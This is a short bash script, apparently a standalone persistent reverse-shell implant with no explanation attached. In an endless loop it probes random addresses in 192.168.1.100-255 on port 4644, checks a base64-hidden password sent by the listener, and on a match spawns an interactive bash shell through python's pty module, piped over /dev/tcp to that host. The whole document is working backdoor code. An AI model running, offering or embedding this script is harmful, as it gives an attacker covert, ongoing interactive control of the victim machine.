#!/usr/bin/env bash

ip='192.168.1'
port='4644'
pass='MTIzNDU2Nzg5Cg=='

shell() {
for i in $(seq 100 255 | shuf); do
  com="${ip}.${i}"
 (
if received_pass=$(timeout 0.2 bash -c "exec 3<>/dev/tcp/$com/$port; head -n 1 <&3; exec 3>&-" 2>/dev/null); then
   
   if [ "$received_pass" == "$(echo $pass | base64 -d)" ]; then
      if ! pgrep -f "pty.spawn" > /dev/null; then
         sleep 2.5
         python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
      fi
   fi
fi
 ) &
 sleep 0.02
done
wait
}

while true; do
  sleep 15
  shell
  sleep 15
done
